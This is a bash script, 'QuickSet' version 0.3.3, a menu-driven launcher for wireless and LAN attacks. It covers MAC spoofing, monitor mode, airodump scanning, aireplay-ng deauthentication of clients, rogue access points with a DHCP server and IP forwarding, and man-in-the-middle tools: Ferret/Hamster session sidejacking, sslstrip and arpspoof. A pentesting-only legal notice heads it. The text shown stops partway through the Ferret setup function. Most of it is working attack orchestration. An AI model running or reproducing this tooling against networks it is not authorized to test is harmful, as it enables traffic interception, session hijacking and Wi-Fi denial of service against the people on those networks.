#!/bin/bash
function head()
{
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: quickset.sh
## Version: 0.3.3
## Copyright (C) <2009>  <Snafu>

##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.

##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.

##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to will@configitnow.com

## Comments written with a triple # are notes to myself, please ignore them.

## Colorsets ##
## echo -e "\033[1;32m = Instructions
## echo -e "\033[1;33m = Outputs
## echo -e "\033[34m   = WTFs
## echo -e "\033[1;34m = Headers
## echo -e "\033[36m   = Inputs
## echo -e "\033[31m   = Warnings / Infinite Loops
##_____________________________________________________________________________##


##~The Following Required Programs Must be in Your Path for Full Functionality~##
## macchanger
## Hamster & Ferret
## sslstrip
## arpspoof
## aircrack-ng suite
## dhcpd3-server
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## How can I kill the function loop issue?  A function always wants to finish, even if called off to another function...Useful, but how to kill;  return should work possibly??

## Last command issued below.  Now to find how to make it show the value of the variables.....
## history | tail -n 2 | head -n 1 | awk '{$1=""; print $0}'

## WOULD LIKE TO IMPLEMENT MORE FAST ACTING ATTACK TOOLS THAT REQUIRE LITTLE TO NO SETUP.  If you have a tool you would like added to this script please contact me
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
### don't know if pforge will append on the end of arp-request file...if not I will make pforge_c and pforge_f -or- result to a file via arp-request=$(date +"-%b-%d-%y-%H%M%S"_arp); foo=$arp-request

### Need to investigate the "subject" of Hirte AP....  Should this not be a Router attack??

### Should managed mode channel match monitor mode channel????????

### Figure out if old PIDs are used during a cycle...if not we'll do PID assignments to ensure kill -9s
### Use PIDs to make a greppable list

### Sanitize available devices via
# ifconfig -s | awk '{print $1}' | grep -v Iface > dev_list
# echo "make input"
# read x
# grep -i $x dev_list > /dev/null
# if [ $? -ne 0 ];then
# 	echo "You made bad choice"
# fi

### Find out why the leases look this way /var/lib/dhcp3/dhcpd.leases
###  lease 192.168.10.100 {
###  starts 4 2011/10/06 19:01:58;
###  ends 4 2011/10/06 19:03:10;
###  cltt 4 2011/10/06 19:01:58;
###  binding state active;
###  next binding state free;
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Past notes are within wifi_101.sh <Version 1.5 (FINAL)>
## To grab a deprecated copy of wifi_101.sh do: svn checkout http://wifi-101.googlecode.com/svn/trunk wifi_101

## If you have devices listed as ath0 or something other than wlan or mon, you will have to make appropriate changes to the naming and monitormode functions

## $var is a recycled variable throughout the script

## On 21 September, I matched the MTUs for the routing portions; this FINALLY made it to where the iPhone could connect....!  Part of the problem had been that I was trying to go with a rather high MTU 1800.....This is not recommended as the default for a LAN is 1500, I believe that the fragmentation resulting from the 1800 caused the failures.

## One of the tougher parts of designing this script was weighing in on which programs to include, originally I had decided to implement a KarMetasploit attack.  I later decided against it; instead deciding to focus on smaller programs; with the thought concept that this script is not meant to be an all encompassing tool, but one designed to setup "Quick Fixes".....


## On 4 October I encountered the most difficult situation yet.  For some reason, BASH does not like certain combinations within pipes.  After 3 hours of trying every combination I could come up with, I finally was able to make a randomizer for a NIC in monitor mode that would match the physical device with the virtual one.

## rand_mac=`ifconfig $mac_dev | awk '{print $5}'` && rand_mac=`echo $rand_mac | awk '{print $1}'` (Works)
## -versus-
## ifconfig $mac_dev | grep HWaddr | awk '{print $5} (Failed to work)

## I have no idea why the later command failed to work, I will investigate this later on.

## Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough.  It's what I've truly come to love about my affliction with hacking.


## For Functions with Functions I have found that I like to declare my variables for use within a function at the beginning of the function, then I list my sub-functions, at the end of the sub-functions you will find the parent functions commands.  It may be a strange way to do it, but it works for my readability purposes.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Multiple Sticky Pots are causing issues.  This will probably affect the other two choices for SoftAPs as well.  Found via usage of completly different network settings.  This leads to a loop at the method selection.  Not a script killer, but should be addressed for learning purposes sometime in the near future.  A simple hack to prevent this bug, but not fix it would be to add a variable similar to the dhcpd cleanup function variable for use in seeing if a fake AP already exists.  After I figure out the reason behind the bug, I will decide on whether or not to allow multiple APs.


## Airbase-NG is crashing during extended periods of usage. There are a lot of variables to consider with this bug: nmap, ettercap, dhcp3-server, etc...

## I chose to eliminate xterm as a factor by just using: (airbase-ng -c $sac -e "$SSID" $pii &) within the script, hoping for an error message.  I had previously tried a variety of methods to evoke an error message, but was unsuccessful; evidently airbase-ng doesn't like to issue them out with regards to the at0 interface

## I waited a little bit for at0 to not exist anymore, and then issued <crtl+c> within the script.  The idea worked and I was given the following as output: ./quickset.sh: line 1:  1866 Segmentation fault      airbase-ng -c $sac -e "$SSID" $pii

## Of course multiple things were happening when the seg fault issue arose (ettercap, nmap, normal network traffic and such that iPhones like to send out {sending personal information that you never really intended to have sent out in the first place, but that is a story all in itself}.  My next idea was to reboot and start fresh.  I followed my script all the way through the creation of the SoftAP and the DHCP server.  I then connected my iPhone and sent it pings until the interface no longer existed.  The following 3 lines are the final output statistics before I stopped the ping.

## --- 192.168.10.100 ping statistics ---
## 1103 packets transmitted, 688 received, +1 duplicates, 37% packet loss, time 1106321ms
## rtt min/avg/max/mdev = 3.402/6.487/12.889/0.974 ms

## I then setup a softap without using a dhcp server; with the following parameters
## airbase-ng mon0 -c 6 -e "poof"
## ifconfig at0 up 169.254.191.1 netmask 255.255.255.0
## Roughly 5 minutes into it a segmentation fault occured

## My next step will be to try this on Lucid Lynx since it is roughly the same
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## My scripting style is derived from carlos_perez@darkoperator.com
## Credit for some of the attacks in this script to him as well

## Grant Pearson for having me RTFM with xterm debugging

## comaX for showing me how much easier it is to follow conditional statements if blank spaces are added in

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
read
}

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
init_setup--()
{
clear
echo -e "\033[1;32m\n--------------------------------------------------------------------------------------
         Only Certain Modes in this Script Require Both Devices to be Defined
--------------------------------------------------------------------------------------\033[1;34m\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                   Initial NIC Setup
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Wireless NIC           [\033[1;33m$pre_pii\033[36m] (Disregard this if already in Monitor Mode)

2) Enable Monitor Mode    [\033[1;33m$pre_pii\033[36m] (Disregard this if already in Monitor Mode)

3) Internet Connected NIC [\033[1;33m$IE\033[36m]

4) Monitor Mode NIC       [\033[1;33m$pii\033[36m]

5) Kill Monitor Mode

6) MAC Address Options

7) List Available NICs

8) Proceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read init_var
case $init_var in
	1) mon_live=x
	echo -e "\033[36m\nDefine NIC"
	read pre_pii
	init_setup--;;

	2) if [[ $mon_live != x ]]; then
		echo -e "\033[31mYOU MUST DEFINE THE WIRELESS NIC FIRST"
		read
		init_setup--
	else
		monitormode--
		init_setup--
	fi;;

	3) echo -e "\033[36m\nDefine NIC" 
	read IE
	init_setup--;;

	4) echo -e "\033[36m\nDefine NIC" 
	read pii
	init_setup--;;

	5) kill_mon=x
	monitormode--
	init_setup--;;

	6) mac_control--;;

	7) nics--
	init_setup--;;

	8) main_menu--;;

	*) init_setup--;;
esac
}

monitormode--()
{
var= ## Nulled
KM= ## Device to kill
KM_II= ## Physical device to kill
clear
echo -e "\033[1;33m"
ifconfig -a | grep wlan | awk '{ print $1"   "$5 }'; ifconfig -a | grep mon | awk '{ print $1"    "$5 }'
sleep 1
if [[ $kill_mon = x ]];then
echo -e "\033[31m\n
                              ***WARNING***\033[32m
       Do not attempt to directly disable Monitor Mode on a Physical Device
        The script will ask for the associated Physical Device when ready\033[31m
                              ***WARNING***"
	sleep 1
	while [ -z $KM ];do
		echo -e "\033[36m\nMonitor Mode Device to Kill?"
		read KM
	done

	while [ -z $var ];do
		echo -e "\033[36m\nIs \033[1;33m$KM\033[36m associated with a Physical Device? (y or n)"
		read var
		case $var in
			y|Y) while [ -z $KM_II ];do 
				echo -e "\033[36m\nPhysical Device Name?"
				read KM_II
			done
			echo -e "\033[1;33m"
			airmon-ng stop $KM_II && airmon-ng stop $KM ;;

			n|N) echo -e "\033[1;33m" 
			airmon-ng stop $KM ;;

			*) var=
		esac
	done

	echo -e "\n\n\033[1;32mPress Enter to Continue"
	read
else
	airmon-ng start $pre_pii
	sleep 1
	var= ## Nulled
	while [ -z $var ];do
		echo -e "\033[36m\nDevice Name Assigned for Monitor Mode on \033[1;33m$pre_pii\033[36m?\n(i.e.  mon0, mon1, mon2?, etc....)"
		read var
	done

	pii=$var
fi
}

nics--()
{
clear
echo -e "\033[1;33m"
airmon-ng && ifconfig -a | grep --color=never HWaddr | awk '{ print $1"    "$5 }'
echo -e "\n\n\033[1;32mPress Enter to Continue"
read
}

mac_control--()
{

	mac_control_II--()
	{
	mac_dev= ## Nulled
	mac_devII= ## Nulled
	rand= ## Nulled
	var_II= ## Nulled
	sam= ## Variable for SoftAP MAC address
	clear
	echo -e "\033[31m\n
                              ***WARNING***\033[32m
       Do not attempt to directly change a Virtual Device (Monitor Mode NIC)
This script requires Physical and Virtual devices to have matching MAC Addresses\033[31m
                              ***WARNING***"
	sleep 1
	while [ -z $mac_dev ];do
		echo -e "\033[36m\n\n\n\n\n\nNIC to Change?"
		read mac_dev
	done

	while [ -z $rand ];do
		echo -e "\033[36m\nRandom MAC? (y or n)"
		read rand
		case $rand in
			y|Y) ;;

			n|N) while [ -z $sam ];do
			echo -e "\033[36m\nDesired MAC Address for \033[1;33m$mac_dev\033[36m?"
			read sam
			done;;

			*) rand= ;;
		esac
	done

	while [[ $var_II != x ]];do
		echo -e "\033[36m\nDoes \033[1;33m$mac_dev\033[36m have a Monitor Mode NIC associated with it? (y or n)"
		read var
		case $var in
			n|N|y|Y) var_II=x ;;
			*) var_II= ;;
		esac
	done

	case $var in
		y|Y) case $rand in
			y|Y) while [ -z $mac_devII ];do
				echo -e "\033[36m\nMonitor Mode NIC name?"
				read mac_devII
			done

			ifconfig $mac_dev down
			ifconfig $mac_devII down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -r $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				read
				mac_control--
			else
				rand_mac=`ifconfig $mac_dev | awk '{print $5}'`
				rand_mac=`echo $rand_mac | awk '{print $1}'`
				echo -e "\033[1;33m\n$mac_devII `macchanger -m $rand_mac $mac_devII`"
				if [ $? -ne 0 ];then
					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
					ifconfig $mac_devII up
					read
					mac_control--
				else
					ifconfig $mac_dev up
					ifconfig $mac_devII up
					echo -e "\033[32m\n\n\n\nPress Enter to Continue"
					read
					mac_control--
				fi
			fi;;

			n|N) echo -e "\033[36m\nMonitor Mode NIC name?"
			read mac_devII
			ifconfig $mac_dev down
			ifconfig $mac_devII down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -m $sam $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				read
				mac_control--
			else
				echo -e "\033[1;33m\n$mac_devII `macchanger -m $sam $mac_devII`"
				if [ $? -ne 0 ];then
					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
					ifconfig $mac_devII up
					read
					mac_control--
				else
					ifconfig $mac_dev up
					ifconfig $mac_devII up
					echo -e "\033[32m\n\n\n\nPress Enter to Continue"
					read
					mac_control--
				fi
			fi;;
		esac;;

		n|N)
		case $rand in
			y|Y) ifconfig $mac_dev down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -r $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				read
				mac_control--
			else
				ifconfig $mac_dev up
				echo -e "\033[32m\n\n\n\nPress Enter to Continue"
				read
				mac_control--
			fi;;

			n|N) ifconfig $mac_dev down
			clear
			echo -e "\033[1;33m\n--------------------\nChanging MAC Address\n--------------------"
			echo -e "\033[1;33m\n$mac_dev `macchanger -m $sam $mac_dev`"
			if [ $? -ne 0 ];then
				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
				ifconfig $mac_dev up
				read
				mac_control--
			else
				ifconfig $mac_dev up
				echo -e "\033[32m\n\n\n\nPress Enter to Continue"
				read
				mac_control--
			fi;;
		esac;;
	esac
	}

clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --MAC Address Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
(L)ist Available NICs

(C)hange a NIC MAC Address

(P)revious Menu

(M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	l|L) nics--
	mac_control--;;

	c|C) mac_control_II--;;

	p|P) case $init_var in
		6) init_setup--;;
		*) init_var=
		setups--;;
	esac;;

	m|M) main_menu--;;

	*) mac_control--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
greet--()
{
clear
echo -e "\033[1;34m\n\n\n\n\n\n\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
QuickSet - A Quick Way to Setup a Wired/Wireless Hack
      Author: Snafu ----> will@configitnow.com
           Read Comments Prior to Usage
           Version 0.3.3 (11 October 2011)\033[1;33m


        IP Forwarding via the Kernel Enabled
       Proceed to Routing Features to Disable\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;32m\n\n\n\n
              PRESS ENTER TO CONTINUE"
read
echo "1" > /proc/sys/net/ipv4/ip_forward
ap_check= ## Nulled
init_setup--
}

usage--()
{
clear
echo -e "\033[1;32m\nUsage: ./quickset.sh"
}

main_menu--()
{
# scan_var= ## Variable for determining where Wireless Channel Recon was called from
trap cleanup-- INT
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~
     --Main Menu--
Make Your Selection Below
~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Setup Menu

2) Wireless Channel Recon

3) Crack Some WiFi

4) Quick Attacks

5) Routing Features

6) Exit Script\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) setups--;;

	2) scan_var=main 
	sc=1-11 ## Channels to scan on
	hop=1500 ## time between channel hops
	scan--;;

	3) wifi_101--;;

	4) atk_menu--;;

	5) routing--;;

	6) cleanup--;;

	*) main_menu--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~ main_menu-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
setups--()
{
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         --Setup Menu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
(I)PTABLES Configuration

(L)ist Available NICs

(N)IC Names & Monitor Mode Setup

(M)AC Address Options

(R)eturn to the Main Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	i|I) ipt_--;;

	l|L) nics--
	setups--;;

	n|N) naming--;;

	m|M) mac_control--;;

	r|R) main_menu--;;

	*) setups--;;
esac
}

scan--()
{
#ias_pid= ##PID for initial Airodump-NG scan
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --Channel Scanning Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
(S)pecified Channels [\033[1;33m$sc\033[36m]
   Examples --> 1 -or- 1,2,3 -or- 1-11

(H)op Frequency (ms) [\033[1;33m$hop\033[36m]

(P)roceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		s|S) echo -e "\033[36m\nChannel(s)?"
		read sc
		scan--;;

		h|H) echo -e "\033[36m\nHop Frequency?"
		read hop
		scan--;;

		p|P) if [[ -z $sc || -z $hop ]];then
			echo -e "\033[31mYou Must Enter the Channels and Hop to Proceed"
			read
			scan--
		fi;;

		*) scan--;;
	esac

clear
echo -e "\033[1;32m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~ Make sure to copy any info you need  ~~~~~~~
~~~~~~~~    from the Airodump-NG splash     ~~~~~~~~
~~~~~~~~                                    ~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~  Press Enter to Launch Airodump-NG  ~~~~~~~~

****************************************************
Come back to THIS screen to continue with the script
****************************************************

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read
xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & ias_pid=$!
rescan--
}

## wifi_101-- is at the bottom of this script due to length

atk_menu--()
{
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                  --Attack Menu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Ferret

2) Hamster

3) SSLStrip

4) Arpspoof

5) Return to the Main Menu
\033[1;32m
--> All Attacks launched in `pwd`\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read var
case $var in
	1) ferret--;;

	2) if [[ -f hamster.txt ]];then
		xterm -bg black -fg grey -sb -rightbar -title Hamster -e hamster &
	else
		echo -e "\033[31m\n\nhamster.txt MUST exist to run hamster"
		read
		atk_menu--
	fi;;

	3) strip_em--;;

	4) arpspoof--;;

	5) main_menu--;;

	*) atk_menu--;;
esac
}

routing--()
{
## The order of functions are for 2, 3 and 4 are: ap_pre_var--(), ap_setup--(), ap--()
## The order of functions for the DHCP server is: dhcp_pre_var--(), dhcp_svr--()
# rte_choice= Routing Option Variable for use with IPTABLES setups...
private= ## Wifi Range Extender trip variable
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~
    --Routing Features--
~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Kernel Forwarding

2) Wireless Vaccuum

3) StickyPot

4) WiFi Range Extender

5) DHCP Server

6) Return to the Main Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
read rte_choice
case $rte_choice in
	1) k_for--;;

	2) if  [[ -z $IE || -z $pii ]];then
		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be defined before proceeding"
		read
		routing--
	else
		ap_pre_var--
		ap_setup--
	fi;;

	3) if  [[ -z $pii ]];then
		echo -e "\033[31mMonitor Mode NIC MUST be defined before proceeding"
		read
		routing--
	else
		ap_pre_var--
		ap_setup--
	fi;;

	4) if  [[ -z $IE || -z $pii ]];then
		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be defined before proceeding"
		read
		routing--
	else
		private=x
		ap_pre_var--
		ap_setup--
	fi;;

	5) dhcp_pre_var--
	if [[ $ap_check != x ]]; then
		ap_pre_var--
	fi

	dhcp_svr--;;

	6) main_menu--;;

	*) routing--;;
esac
}

cleanup--()
{
echo -e "\033[36m\nPerform Cleanup of Hidden Processes? (y or n)"
read var
case $var in
	y|Y) if [[ $dhcp_svr_stat = x ]]; then
		killall dhcpd3
	fi;;
esac

exit
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~ setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
ipt_--()
{
## The basic premise behind this function is to have a basic overview and flush capability for iptables.
## It is in no way to be an all encompassing tool.
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~
IPTABLES Configurations
~~~~~~~~~~~~~~~~~~~~~~~\033[36m
(L)ist Tables

(F)lush Tables

(P)revious Menu

(M)ain Menu\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~\n"
read var 
case $var in
	l|L) iptables-save | egrep -v "Generated by|COMMIT|Completed on"
	read
	ipt_--;;

	f|F) ipt_flush--;;

	p|P) setups--;;

	m|M) main_menu--;;

	*) ipt_--;;
esac
}

naming--()
{
var= ## Nulled
clear
while [ -z $var ];do
	echo -e "\033[31m\n
                        ***WARNING***\033[32m
Proceeding further will erase all NIC variable names for this script
Doing so requires that you rename them for this script to work properly\033[31m
                        ***WARNING***
          

\033[36mDo you wish to continue? (y) or (n)\n"
	read var
done

case $var in
	y|Y) IE= ## Nulled
	pii= ## Nulled
	pre_pii= ## Nulled
	init_setup--;;
	
	n|N) setups--;;
	*) naming--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ scan-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
rescan--()
{
echo -e "\033[36m\nWould you like to DeAuth to reveal hidden ESSIDS? (y or n)"
read var
case $var in
	y|Y) deauth--;;

	n|N) case $scan_var in
		main) main_menu--;;
		wifi) venue--;;
	esac;;

	*) rescan--;;
esac
}

deauth--()
{
sc= ## Nulled
rb= ## Router BSSID
#dea_pid= ## Deauth Scan PID

	deauth_II--()
	{
	dt= ## DeAuth Type
	cm= ## Client MAC

		switch_deauth--()
		{
		kill -9 $dea_pid &
		sleep .7
		sc= ## Nulled
		while [ -z $sc ];do
			echo -e "\033[36m\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-11)"
			read sc
		done

		hop= ## Nulled
		while [ -z $hop ];do	
			echo -e "\033[36m\nms between channel hops?"
			read hop
		done

		xterm -bg black -fg grey -sb -rightbar -title AiroDump -e airodump-ng -f $hop $pii --channel $sc & dea_pid=$!
		sleep .7
		deauth--
		}

		deauth_III--()
		{
		r_d= ## Repeat DeAuth Variable
		while [ -z $r_d ];do
			echo -e "\033[36m\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth" 
			read r_d
		done

		case $r_d in
			r|R) 	case $dt in
					b|B) echo -e "\033[1;33m" 
					aireplay-ng $pii -0 3 -a $rb
					deauth_III--;;

					c|C) echo -e "\033[1;33m" 
					aireplay-ng $pii -0 3 -a $rb -c $cm
					deauth_III--;;
				esac;;

			c|C) clear 
			deauth_II--;;

			s|S) switch_deauth--;;

			e|E) case $scan_var in
				main) main_menu--;;
				wifi) venue--;;
			esac;; 

			*) deauth_III--;;
		esac
		}

	while [ -z $dt ];do
		echo -e "\033[36m\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
		read dt
	done

	case $dt in
		b|B) echo -e "\033[1;33m" 
		aireplay-ng $pii -0 4 -a $rb
		deauth_III--;;

		c|C) cm= ## Nulled
		while [ -z $cm ];do
			echo -e "\033[36m\nClient MAC address?"
			read cm
		done

		echo -e "\033[1;33m"
		aireplay-ng $pii -0 4 -a $rb -c $cm
		deauth_III--;;

		s|S) switch_deauth--;;

		e|E) case $scan_var in
			main) main_menu--;;
			wifi) venue--;;
		esac;;

		*) deauth_II--;;
	esac
	}

while [ -z $sc ];do
	echo -e "\033[36m\nSpecified Channel? (1-11) {choose only one channel}"
	read sc
done

while [ -z $rb ];do
	echo -e "\033[36m\nRouter BSSID?"
	read rb
done

kill -9 $ias_pid &
sleep .7
xterm -bg black -fg grey -sb -rightbar -title Airodump -e airodump-ng $pii --channel $sc --bssid $rb & dea_pid=$!
sleep .7
deauth_II--
clear
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~ atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
ferret--()
{
## fer_dev= Device to be sniffed
## fer_type= Wifi or Wired
## wifi_check= Allowing us the conditional choice for a non default ferret setting of channel 6 if we use a wifi device

	ferret_II--()
	{
#	fer_chan= ## Channel to sniff on
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --Ferret Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) List Available NICs

2) Device to Sniff  [\033[1;33m$fer_dev\033[36m]

3) Type of Device   [\033[1;33m$fer_type\033[36m]

4) Return to Previous Menu

5) Return to Main Menu

6) Proceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) nics--
		ferret_II--;;

		2) echo -e "\033[36m\nDevice?"
		read fer_dev
